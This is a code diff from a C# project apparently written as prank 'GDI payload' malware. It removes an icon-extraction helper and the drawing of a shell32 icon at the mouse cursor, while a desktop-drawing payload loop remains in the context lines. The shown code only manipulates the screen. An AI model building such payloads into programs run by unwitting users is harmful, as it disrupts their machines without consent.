@@ -43,10 +43,6 @@ namespace VirsCh
             int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, TernaryRasterOperations dwRop);
         [DllImport("gdi32.dll", EntryPoint = "DeleteDC")]
         public static extern bool DeleteDC(IntPtr hdc);
-        [DllImport("Shell32.dll", EntryPoint = "ExtractIconExW", CharSet = CharSet.Unicode, ExactSpelling = true,
-        CallingConvention = CallingConvention.StdCall)]
-        private static extern int ExtractIconEx(string sFile, int iIndex, out IntPtr piLargeVersion,
-            out IntPtr piSmallVersion, int amountIcons);
         [DllImport("User32.dll")]
         static extern int ReleaseDC(IntPtr hwnd, IntPtr dc);
 
@@ -110,21 +106,6 @@ namespace VirsCh
             }
         }
 
-        public static Icon Extract(string file, int number, bool largeIcon)
-        {
-            IntPtr large;
-            IntPtr small;
-            ExtractIconEx(file, number, out large, out small, 1);
-            try
-            {
-                return Icon.FromHandle(largeIcon ? large : small);
-            }
-            catch
-            {
-                return null;
-            }
-        }
-
         public static void GDI_payloads()
         {
             Random r = new Random();
@@ -144,7 +125,6 @@ namespace VirsCh
             IntPtr mhdc = CreateCompatibleDC(hdc);
             IntPtr hbit = CreateCompatibleBitmap(hdc, x, y);
             IntPtr holdbit = SelectObject(mhdc, hbit);
-            Icon some_ico = Extract("shell32.dll", 232, true);
             POINT[] lppoint = new POINT[3];
             for (int num = 0; num < 100; num++)
             {
@@ -166,10 +146,6 @@ namespace VirsCh
                 int posX = Cursor.Position.X;
                 int posY = Cursor.Position.Y;
                 desktop = GetDC(IntPtr.Zero);
-                using (Graphics g = Graphics.FromHdc(desktop))
-                {
-                    g.DrawIcon(some_ico, posX, posY);
-                }
                 ReleaseDC(IntPtr.Zero, desktop);
                 Thread.Sleep(50);
             }
